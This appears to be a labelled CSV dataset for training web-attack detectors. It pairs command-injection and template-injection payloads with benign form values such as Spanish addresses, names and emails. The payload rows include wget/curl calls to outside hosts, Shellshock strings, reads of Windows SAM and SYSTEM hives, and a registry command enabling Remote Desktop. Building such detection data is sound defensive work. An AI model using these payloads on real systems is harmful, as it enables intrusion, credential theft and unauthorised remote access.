payload,length,attack_type,label
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",90,cmdi,anom
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",81,cmdi,anom
:phpversion();,14,cmdi,anom
`ping 127.0.0.1`,16,cmdi,anom
& ping -i 30 127.0.0.1 &,24,cmdi,anom
& ping -n 30 127.0.0.1 &,24,cmdi,anom
;${@print(md5(RCEVulnerable))};,31,cmdi,anom
"${@print(""RCEVulnerable"")}",26,cmdi,anom
${@print(system($_SERVER['HTTP_USER_AGENT']))},46,cmdi,anom
pwd,3,cmdi,anom
| pwd,5,cmdi,anom
; pwd,5,cmdi,anom
& pwd,5,cmdi,anom
&& pwd,6,cmdi,anom
\r,2,cmdi,anom
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",108,cmdi,anom
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",108,cmdi,anom
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",108,cmdi,anom
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",109,cmdi,anom
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",106,cmdi,anom
\r\n,4,cmdi,anom
route,5,cmdi,anom
| sleep 1,9,cmdi,anom
; sleep 1,9,cmdi,anom
& sleep 1,9,cmdi,anom
&& sleep 1,10,cmdi,anom
sleep 1,7,cmdi,anom
|| sleep 10,11,cmdi,anom
| sleep 10,10,cmdi,anom
; sleep 10,10,cmdi,anom
{${sleep(10)}},14,cmdi,anom
& sleep 10 ,11,cmdi,anom
&& sleep 10,11,cmdi,anom
sleep 10,8,cmdi,anom
|| sleep 15,11,cmdi,anom
| sleep 15,10,cmdi,anom
; sleep 15,10,cmdi,anom
& sleep 15 ,11,cmdi,anom
&& sleep 15,11,cmdi,anom
 {${sleep(20)}},15,cmdi,anom
{${sleep(20)}},14,cmdi,anom
 {${sleep(3)}},14,cmdi,anom
{${sleep(3)}},13,cmdi,anom
| sleep 5,9,cmdi,anom
; sleep 5,9,cmdi,anom
& sleep 5,9,cmdi,anom
&& sleep 5,10,cmdi,anom
sleep 5,7,cmdi,anom
 {${sleep(hexdec(dechex(20)))}} ,32,cmdi,anom
{${sleep(hexdec(dechex(20)))}} ,31,cmdi,anom
sysinfo,7,cmdi,anom
| sysinfo,9,cmdi,anom
; sysinfo,9,cmdi,anom
& sysinfo,9,cmdi,anom
&& sysinfo,10,cmdi,anom
system('cat C:\boot.ini');,26,cmdi,anom
system('cat config.php');,25,cmdi,anom
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,64,cmdi,anom
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,63,cmdi,anom
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,63,cmdi,anom
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,63,cmdi,anom
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,64,cmdi,anom
system('curl https://crowdshield.com/.testing/rce_vuln.txt'),60,cmdi,anom
system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),73,cmdi,anom
system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,62,cmdi,anom
system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1515,cmdi,anom
systeminfo,10,cmdi,anom
| systeminfo,12,cmdi,anom
; systeminfo,12,cmdi,anom
& systeminfo,12,cmdi,anom
&& systeminfo,13,cmdi,anom
system('ls'),12,cmdi,anom
system('pwd'),13,cmdi,anom
system('pwd');,14,cmdi,anom
|| system('sleep 5');,21,cmdi,anom
| system('sleep 5');,20,cmdi,anom
; system('sleep 5');,20,cmdi,anom
& system('sleep 5');,20,cmdi,anom
&& system('sleep 5');,21,cmdi,anom
system('sleep 5'),17,cmdi,anom
system('sleep 5');,18,cmdi,anom
system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),73,cmdi,anom
system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,62,cmdi,anom
system('whoami'),16,cmdi,anom
system('whoami');,17,cmdi,anom
test*; ls -lhtR /var/www/,25,cmdi,anom
"test* || perl -e 'print ""X""x16096'",34,cmdi,anom
"test* | perl -e 'print ""X""x16096'",33,cmdi,anom
"test* & perl -e 'print ""X""x16096'",33,cmdi,anom
"test* && perl -e 'print ""X""x16096'",34,cmdi,anom
"test*; perl -e 'print ""X""x16096'",32,cmdi,anom
$(`type C:\boot.ini`),21,cmdi,anom
&&type C:\\boot.ini,19,cmdi,anom
| type C:\Windows\repair\SAM,28,cmdi,anom
; type C:\Windows\repair\SAM,28,cmdi,anom
& type C:\Windows\repair\SAM,28,cmdi,anom
&& type C:\Windows\repair\SAM,29,cmdi,anom
type C:\Windows\repair\SAM,26,cmdi,anom
| type C:\Windows\repair\SYSTEM,31,cmdi,anom
; type C:\Windows\repair\SYSTEM,31,cmdi,anom
& type C:\Windows\repair\SYSTEM,31,cmdi,anom
&& type C:\Windows\repair\SYSTEM,32,cmdi,anom
type C:\Windows\repair\SYSTEM,29,cmdi,anom
| type C:\WINNT\repair\SAM,26,cmdi,anom
; type C:\WINNT\repair\SAM,26,cmdi,anom
& type C:\WINNT\repair\SAM,26,cmdi,anom
&& type C:\WINNT\repair\SAM,27,cmdi,anom
type C:\WINNT\repair\SAM,24,cmdi,anom
type C:\WINNT\repair\SYSTEM,27,cmdi,anom
| type %SYSTEMROOT%\repair\SAM,30,cmdi,anom
; type %SYSTEMROOT%\repair\SAM,30,cmdi,anom
& type %SYSTEMROOT%\repair\SAM,30,cmdi,anom
&& type %SYSTEMROOT%\repair\SAM,31,cmdi,anom
type %SYSTEMROOT%\repair\SAM,28,cmdi,anom
| type %SYSTEMROOT%\repair\SYSTEM,33,cmdi,anom
; type %SYSTEMROOT%\repair\SYSTEM,33,cmdi,anom
& type %SYSTEMROOT%\repair\SYSTEM,33,cmdi,anom
&& type %SYSTEMROOT%\repair\SYSTEM,34,cmdi,anom
type %SYSTEMROOT%\repair\SYSTEM,31,cmdi,anom
uname,5,cmdi,anom
;uname;,7,cmdi,anom
| uname -a,10,cmdi,anom
; uname -a,10,cmdi,anom
& uname -a,10,cmdi,anom
&& uname -a,11,cmdi,anom
uname -a,8,cmdi,anom
|/usr/bin/id,12,cmdi,anom
;|/usr/bin/id|,14,cmdi,anom
;/usr/bin/id|,13,cmdi,anom
$;/usr/bin/id,13,cmdi,anom
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",215,cmdi,anom
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,68,cmdi,anom
| wget http://crowdshield.com/.testing/rce.txt,46,cmdi,anom
& wget http://crowdshield.com/.testing/rce.txt,46,cmdi,anom
; wget https://crowdshield.com/.testing/rce_vuln.txt,52,cmdi,anom
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),55,cmdi,anom
&& wget https://crowdshield.com/.testing/rce_vuln.txt,53,cmdi,anom
wget https://crowdshield.com/.testing/rce_vuln.txt,50,cmdi,anom
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),69,cmdi,anom
which curl,10,cmdi,anom
which gcc,9,cmdi,anom
which nc,8,cmdi,anom
which netcat,12,cmdi,anom
which perl,10,cmdi,anom
which python,12,cmdi,anom
which wget,10,cmdi,anom
whoami,6,cmdi,anom
| whoami,8,cmdi,anom
; whoami,8,cmdi,anom
' whoami,8,cmdi,anom
' || whoami,11,cmdi,anom
' & whoami,10,cmdi,anom
' && whoami,11,cmdi,anom
'; whoami,9,cmdi,anom
" whoami
 || whoami",19,cmdi,anom
" | whoami
 & whoami",20,cmdi,anom
" && whoami
; whoami",20,cmdi,anom
$(`whoami`),11,cmdi,anom
& whoami,8,cmdi,anom
&& whoami,9,cmdi,anom
"{{ get_user_file(""C:\boot.ini"") }}",34,cmdi,anom
"{{ get_user_file(""/etc/hosts"") }}",33,cmdi,anom
{{4+4}},7,cmdi,anom
{{4+8}},7,cmdi,anom
{{person.secret}},17,cmdi,anom
{{person.name}},15,cmdi,anom
{1} + {1},9,cmdi,anom
{% For c in [1,14,cmdi,anom
{{[] .__ Class __.__ base __.__ subclasses __ ()}},50,cmdi,anom
antigua de ancora s/n,21,norm,norm
calle dean miranda 106,22,norm,norm
10380,5,norm,norm
madgett,7,norm,norm
gerola pugliesi,15,norm,norm
36574,5,norm,norm
c/ comedias,11,norm,norm
8.61689E+15,11,norm,norm
tanchak,7,norm,norm
antigua de ancora s/n,21,norm,norm
calle dean miranda 106,22,norm,norm
10380,5,norm,norm
madgett,7,norm,norm
gerola pugliesi,15,norm,norm
36574,5,norm,norm
c/ comedias,11,norm,norm
8.61689E+15,11,norm,norm
tanchak,7,norm,norm
don quijote 81,14,norm,norm
ceferina,8,norm,norm
saturnino,9,norm,norm
israel_piggot@joyclub.pe,24,norm,norm
5n37do,6,norm,norm
lanfranchi@getgold.tl,21,norm,norm
micaas,6,norm,norm
herrmann@codwatw.edu,20,norm,norm
9.48E+15,8,norm,norm
5.83899E+15,11,norm,norm
ajoy,4,norm,norm
irissou,7,norm,norm
quisto,6,norm,norm
s5bal850de,10,norm,norm
balsam-prey@mmo.com.cat,23,norm,norm
lurlene,7,norm,norm
c/ elvas 112,12,norm,norm
de canoves 13,13,norm,norm
hembrick,8,norm,norm
1.76488E+15,11,norm,norm
darcy@google-movil.dz,21,norm,norm
katia,5,norm,norm
lenya@fbi-criminal-network.com.mil,34,norm,norm
3.81894E+15,11,norm,norm
penarroya ingla,15,norm,norm
6.65741E+15,11,norm,norm
calle artigako haritza,22,norm,norm
kiyohara,8,norm,norm
iracema,7,norm,norm
2719,4,norm,norm
recabdador,10,norm,norm
40142,5,norm,norm
bernadet,8,norm,norm
76150645z,9,norm,norm
29540,5,norm,norm
nehemiah,8,norm,norm
reiji,5,norm,norm
plaa gabriela mistral,21,norm,norm
mirabel,7,norm,norm
sanidad,7,norm,norm
arriharn espinet,16,norm,norm
alguer murillo,14,norm,norm
47419,5,norm,norm
swearing,8,norm,norm
lightfie,8,norm,norm
epnimo,6,norm,norm
guillen,7,norm,norm
mahbeer,7,norm,norm
zohar@pablobracamonte.bh,24,norm,norm
azarshah,8,norm,norm
m7124v3,7,norm,norm
medianero,9,norm,norm
euzaine@schnapps.com.gs,23,norm,norm
amelia,6,norm,norm
estival,7,norm,norm
3.98E+15,8,norm,norm
calle manco,11,norm,norm
vinko,5,norm,norm
parke antonio trueba 175,24,norm,norm
8.5138E+15,10,norm,norm
9.84215E+15,11,norm,norm
calle la revoltosa,18,norm,norm
calle hostieros,15,norm,norm
condensativo,12,norm,norm
44706,5,norm,norm
5.88977E+15,11,norm,norm
poma gozalbo,12,norm,norm
40592671v,9,norm,norm
contreras,9,norm,norm
18611,5,norm,norm
ma724-3ra,9,norm,norm
olaya,5,norm,norm
17744,5,norm,norm
7118,4,norm,norm
19219,5,norm,norm
lula,4,norm,norm
9.84is22nte334c799,18,norm,norm
rub de bracamonte,17,norm,norm
75771832b,9,norm,norm
muthuswa,8,norm,norm
d76en3r9n8z01,13,norm,norm
c/ padilla,10,norm,norm
8.85119E+15,11,norm,norm
salter@quiromante.com.mg,24,norm,norm
es3regamiento,13,norm,norm
aflechate,9,norm,norm
63829565b,9,norm,norm
60613075w,9,norm,norm
freydig rueda,13,norm,norm
itrabo,6,norm,norm
credido poma,12,norm,norm
29491,5,norm,norm
1064,4,norm,norm
gula,4,norm,norm
de1l2nda9ur4,12,norm,norm
c/ honduras,11,norm,norm
vajih,5,norm,norm
salinillas de bureba,20,norm,norm
6267,4,norm,norm
c/ san ildefonso 106 10?h,25,norm,norm
goldsmith1@esmarbella.ht,24,norm,norm
arraia-maeztu,13,norm,norm
34112,5,norm,norm
protoalbitar,12,norm,norm
pontevedra,10,norm,norm
savoula,7,norm,norm
2144,4,norm,norm
albeta,6,norm,norm
96761343k,9,norm,norm
lamentante,10,norm,norm
50159319e,9,norm,norm
andrs castanyer,15,norm,norm
neugebauer@buscamoto.gw,23,norm,norm
harmony,7,norm,norm
vlez acejas,11,norm,norm
enlutada,8,norm,norm
gabriela1,9,norm,norm
c/ david 169 6-h,16,norm,norm
methi,5,norm,norm
graciliano,10,norm,norm
61,2,norm,norm
4.13841E+15,11,norm,norm
steele,6,norm,norm
1.44E+15,8,norm,norm
brockie,7,norm,norm
depredador,10,norm,norm
comalada,8,norm,norm
7633,4,norm,norm
robledo,7,norm,norm
37793,5,norm,norm
archie,6,norm,norm
47649,5,norm,norm
4a2ho4a2o,9,norm,norm
c/ coca de la piera 167,23,norm,norm
oseja,5,norm,norm
31410,5,norm,norm
1.07544E+15,11,norm,norm
36823414t,9,norm,norm
ginest baquedano,16,norm,norm
mallo etchart,13,norm,norm
nanclares espejo,16,norm,norm
serpiginoso,11,norm,norm
calle dinamarca 14,18,norm,norm
72523597c,9,norm,norm
67242195q,9,norm,norm
6.05128E+15,11,norm,norm
aricel,6,norm,norm
c/ concepcion alexandre 82,26,norm,norm
v5llo34,7,norm,norm
burg,4,norm,norm
4135,4,norm,norm
10161,5,norm,norm
chorrito bajo,13,norm,norm
8623,4,norm,norm
l1b6855ca30e,12,norm,norm
en546al,7,norm,norm
c/ el breton,12,norm,norm
koichi,6,norm,norm
lamarr@tardos.mobi,18,norm,norm
mieza,5,norm,norm
16154,5,norm,norm
salgado,7,norm,norm
16118,5,norm,norm
zapardiel de la ribera,22,norm,norm
maughan@enfuerteventura.com.rw,30,norm,norm
15994230f,9,norm,norm
nazareno,8,norm,norm
shou-che,8,norm,norm
24152,5,norm,norm
villalobn,9,norm,norm
cardedeu 54,11,norm,norm
pl. curro cuchares,18,norm,norm
romeral,7,norm,norm
10300,5,norm,norm
firat6,6,norm,norm
calle marino cervera,20,norm,norm
sparky,6,norm,norm
strock,6,norm,norm
radunsky_oses@guejosgratis.cg,29,norm,norm
alfredo calderon 136,20,norm,norm
hanzlice,8,norm,norm
paucides,8,norm,norm
6.03007E+15,11,norm,norm
puigpunyent,11,norm,norm
zangn,5,norm,norm
chilln,6,norm,norm
6110,4,norm,norm
galindo beneyto,15,norm,norm
ayyuce,6,norm,norm
de_la,5,norm,norm
aventino,8,norm,norm
47185,5,norm,norm
5ecom058a?8a,12,norm,norm
lugar los morros,16,norm,norm
hinkie@goovitae.pg,18,norm,norm
58305784w,9,norm,norm
9.26768E+15,11,norm,norm
grimm@madrid2012.nu,19,norm,norm
michigan,8,norm,norm
igal,4,norm,norm
c/ hermanos pinzon 178,22,norm,norm
grandy,6,norm,norm
serneo,6,norm,norm
bellaguarda,11,norm,norm
cuesta sagrado corazon,22,norm,norm
pike@multasdetransito.gf,24,norm,norm
veneranda,9,norm,norm
torre de arcas,14,norm,norm
darrieu@redstarz.sv,19,norm,norm
sntoma,6,norm,norm
niu,3,norm,norm
eduviges,8,norm,norm
42010181z,9,norm,norm
minera dauns,12,norm,norm
8.96125E+15,11,norm,norm
arima@hormigon-impreso.nu,25,norm,norm
aguinaga achutegui,18,norm,norm
6.90524E+15,11,norm,norm
bradney4,8,norm,norm
shanir,6,norm,norm
34855320q,9,norm,norm
wun,3,norm,norm
stanger-kitabayashi7@gestionsoftware.th,39,norm,norm
calle soria 154 2a,18,norm,norm
humfrey,7,norm,norm
1320,4,norm,norm
poncin@todobetis.mil,20,norm,norm
8170,4,norm,norm
inglis@baltasarsantos.vu,24,norm,norm
tindall-bourne@pintandomucho.cg,31,norm,norm
es518l132n,10,norm,norm
rajadell,8,norm,norm
ramblizo,8,norm,norm
d060u2ar,8,norm,norm
8349,4,norm,norm
brunton9,8,norm,norm
sile,4,norm,norm
8935,4,norm,norm
4.5422E+15,10,norm,norm
1.35689E+15,11,norm,norm
azcrate campalan,16,norm,norm
calle juan sebastian elcano,27,norm,norm
heicy,5,norm,norm
62,2,norm,norm
massimil,8,norm,norm
n89m3nd2,8,norm,norm
6.69143E+14,11,norm,norm
kindelan,8,norm,norm
a79ga44,7,norm,norm
49540097y,9,norm,norm
2.75339E+15,11,norm,norm
ibarra,6,norm,norm
18898337l,9,norm,norm
47gent1r,8,norm,norm
estolano boget,14,norm,norm
sierra bermeja s/n,18,norm,norm
jimnez algora,13,norm,norm
ponsati puratic,15,norm,norm
ocallaghan@asyra.li,19,norm,norm
28670,5,norm,norm
calle joan salvat papasseit s/n,31,norm,norm
28721,5,norm,norm
nardi borgua,12,norm,norm
roger,5,norm,norm
san miguel de abona,19,norm,norm
denni,5,norm,norm
cercs,5,norm,norm
d0s9pi2car,10,norm,norm
o$ficinesca,11,norm,norm
conde,5,norm,norm
menju,5,norm,norm
mccollon@irmedia.ca,19,norm,norm
88360528w,9,norm,norm
16856,5,norm,norm
pesquisar,9,norm,norm
subidor,7,norm,norm
escudero ostria,15,norm,norm
calle conde de cartagena 97 5f,30,norm,norm
3.67249E+15,11,norm,norm
3471,4,norm,norm
marines,7,norm,norm
senda buen paso s/n,19,norm,norm
5366,4,norm,norm
henry@sms24h.tr,15,norm,norm
santaren,8,norm,norm
mejury8,7,norm,norm
38355013y,9,norm,norm
trooger_gereighty@quierocortinas.mil,36,norm,norm
06673981w,9,norm,norm
pche,4,norm,norm
hervs bediaga,13,norm,norm
longo,5,norm,norm
tunaroza capmany,16,norm,norm
37795,5,norm,norm
flixmara,8,norm,norm
roni,4,norm,norm
sertino,7,norm,norm
umbria,6,norm,norm
veri5icat1va,12,norm,norm
2.22584E+14,11,norm,norm
mouchet@007tv.fj,16,norm,norm
parolero,8,norm,norm
polanco,7,norm,norm
jackelyn,8,norm,norm
34310,5,norm,norm
9ar5i04o,8,norm,norm
indocto,7,norm,norm
kouraviev@socimi.com.gl,23,norm,norm
saleh,5,norm,norm
e72i4,5,norm,norm
sant andreu de la barca,23,norm,norm
f8av2,5,norm,norm
49211,5,norm,norm
karin,5,norm,norm
gu5cima,7,norm,norm
keng@glutenfreespain.lb,23,norm,norm
69671861p,9,norm,norm
doriot,6,norm,norm
6.71861E+15,11,norm,norm
gregonio,8,norm,norm
38821598j,9,norm,norm
katy,4,norm,norm
angullo acosta,14,norm,norm
c63en13759,10,norm,norm
23611263s,9,norm,norm
29850288z,9,norm,norm
cancela,7,norm,norm
c/ grabador david roberts 154 1-h,33,norm,norm
1.02549E+15,11,norm,norm
37110,5,norm,norm
de tena leguizamn,17,norm,norm
5154,4,norm,norm
eddisfor4,9,norm,norm
4560,4,norm,norm
4.92079E+15,11,norm,norm
monvar/monver,13,norm,norm
pobla de segur 125,18,norm,norm
23670,5,norm,norm
3.82074E+15,11,norm,norm
15318,5,norm,norm
8121,4,norm,norm
41713468r,9,norm,norm
3.18663E+15,11,norm,norm
san petersburgo,15,norm,norm
71648159p,9,norm,norm
4176,4,norm,norm
gift@distritoeste.no,20,norm,norm
16601924h,9,norm,norm
segura reygadas,15,norm,norm
passeig gaudi 77,16,norm,norm
llasera,7,norm,norm
ca5r7211a,9,norm,norm
16610,5,norm,norm
cantoria,8,norm,norm
hallaran@manjarr.cd,19,norm,norm
haker-durango@mirallesmoscardo.ro,33,norm,norm
22010612a,9,norm,norm
trastabilln,11,norm,norm
rocco-misaki@soybueno.nz,24,norm,norm
20120,5,norm,norm
leonel,6,norm,norm
micr6pil8,9,norm,norm
calle puebla de los infantes,28,norm,norm
bscones de ojeda,16,norm,norm
ares,4,norm,norm
marcelino suarez 39,19,norm,norm
847,3,norm,norm
adalgisa,8,norm,norm
5150,4,norm,norm
88253687l,9,norm,norm
decour raichs,13,norm,norm
cusanelli@wdsl.ao,17,norm,norm
perpi izurrieta,15,norm,norm
robin@comerciosdeaspe.info,26,norm,norm
barcelona 149,13,norm,norm
66718383y,9,norm,norm
incom1a5abl8mente,17,norm,norm
leni,4,norm,norm
baril,5,norm,norm
35210254z,9,norm,norm
teddie,6,norm,norm
espaldilla,10,norm,norm
1.06705E+14,11,norm,norm
reiko,5,norm,norm
portelan9,9,norm,norm
50645313a,9,norm,norm
c28a3iz8,8,norm,norm
45370,5,norm,norm
benavente,9,norm,norm
99020664y,9,norm,norm
5arneci052,10,norm,norm
chimeneas,9,norm,norm
bose,4,norm,norm
041!da2131434e,14,norm,norm
5e011llo,8,norm,norm
c/ relfas 122,13,norm,norm
murillo el cuende,17,norm,norm
aa,2,norm,norm
c/ clivia,9,norm,norm
peral,5,norm,norm
3j,2,norm,norm
3411,4,norm,norm
carretera ribas matama 160,26,norm,norm
18567,5,norm,norm
arco del meson,14,norm,norm
57186589x,9,norm,norm
surai,5,norm,norm
3820,4,norm,norm
childree,8,norm,norm
712,3,norm,norm
bidaurreta,10,norm,norm
sfiroudi,8,norm,norm
caesar-vitez2@apelton.sy,24,norm,norm
56702228y,9,norm,norm
carrera,7,norm,norm
claudio,7,norm,norm
mary-ann,8,norm,norm
norberto,8,norm,norm
caldes,6,norm,norm
7.28065E+15,11,norm,norm
42462633x,9,norm,norm
557ni03r5o,10,norm,norm
shakor,6,norm,norm
rasmia,6,norm,norm
tarp@redstarz.asia,18,norm,norm
seno,4,norm,norm
medwin-whittinghill@enla.th,27,norm,norm
rodolfo,7,norm,norm
hermanos gascon 141,19,norm,norm
28530,5,norm,norm
5083,4,norm,norm
soman,5,norm,norm
84411118z,9,norm,norm
45256,5,norm,norm
tornadizos de vila,18,norm,norm
calle santa teresa,18,norm,norm
incrdu69,8,norm,norm
llombai,7,norm,norm
8.00405E+14,11,norm,norm
ulrico,6,norm,norm
gatada,6,norm,norm
linton,6,norm,norm
gustat0v4,9,norm,norm
6.27383E+15,11,norm,norm
81,2,norm,norm
huyente,7,norm,norm
m9gnificen5i5,13,norm,norm
werkmeister@19horas.zr,22,norm,norm
2100,4,norm,norm
22120,5,norm,norm
rabascall,9,norm,norm
braiam,6,norm,norm
8.99091E+15,11,norm,norm
hofmeist0,9,norm,norm
calle duque de zaragoza s/n,27,norm,norm
c/ san guillermo,16,norm,norm
sahid,5,norm,norm
6660,4,norm,norm
wilde@casasdefamosos.zw,23,norm,norm
9903rti37,9,norm,norm
bablica,7,norm,norm
07485924e,9,norm,norm
5.25502E+15,11,norm,norm
encuar,6,norm,norm
ramss,5,norm,norm
6160,4,norm,norm
0e06u8s17,9,norm,norm
4.61733E+15,11,norm,norm
mclawhor,8,norm,norm
44338,5,norm,norm
fabrelle,8,norm,norm
hormilleja,10,norm,norm
mayor,5,norm,norm
28815,5,norm,norm
pascuala,8,norm,norm
malditamente,12,norm,norm
4.47874E+15,11,norm,norm
5.9555E+15,10,norm,norm
spaeth@directoriogratuito.kr,28,norm,norm
19784273h,9,norm,norm
84881293t,9,norm,norm
carretera estacion,18,norm,norm
coxcojita,9,norm,norm
mohandas,8,norm,norm
cel65co,7,norm,norm
3.21396E+15,11,norm,norm
9805,4,norm,norm
75131649x,9,norm,norm
pierre-y,8,norm,norm
4.46813E+15,11,norm,norm
en8og1da,8,norm,norm
collado mediano,15,norm,norm
des7768ab9e6os,14,norm,norm
gabby,5,norm,norm
isasi urquiza,13,norm,norm
20001,5,norm,norm
cherino gebhardt,16,norm,norm
tracee,6,norm,norm
8615,4,norm,norm
3814,4,norm,norm
perdign,7,norm,norm
c/ corua,8,norm,norm
sangborivutr@ssextremadura.gr,29,norm,norm
tali,4,norm,norm
26256,5,norm,norm
3675,4,norm,norm
5458,4,norm,norm
camino san jaime 97,19,norm,norm
hoeflich@movil-google.cx,24,norm,norm
silvita,7,norm,norm
1.13313E+15,11,norm,norm
02877417w,9,norm,norm
nardo,5,norm,norm
toddi,5,norm,norm
8110,4,norm,norm
raddalgo,8,norm,norm
karlweiss@barnicesuv.gov,24,norm,norm
8.2197E+15,10,norm,norm
26527823z,9,norm,norm
18449,5,norm,norm
c/ san miguel,13,norm,norm
946,3,norm,norm
dollie,6,norm,norm
castillejo de meslen,20,norm,norm
torrescrcela,12,norm,norm
travs elias,11,norm,norm
3.07443E+15,11,norm,norm
pagni7@freecreditcheck.bg,25,norm,norm
noviercas,9,norm,norm
opsito,6,norm,norm
albillos,8,norm,norm
c/ espigo,9,norm,norm
38182378d,9,norm,norm
lev@ozlon.ke,12,norm,norm
a3o1erada,9,norm,norm
5696,4,norm,norm
p4ot8tor,8,norm,norm
bullen,6,norm,norm
58265705n,9,norm,norm
42210,5,norm,norm
amorebieta-etxano,17,norm,norm
digott_sims@enigmatico.ar,25,norm,norm
makazaga millares,17,norm,norm
centeno,7,norm,norm
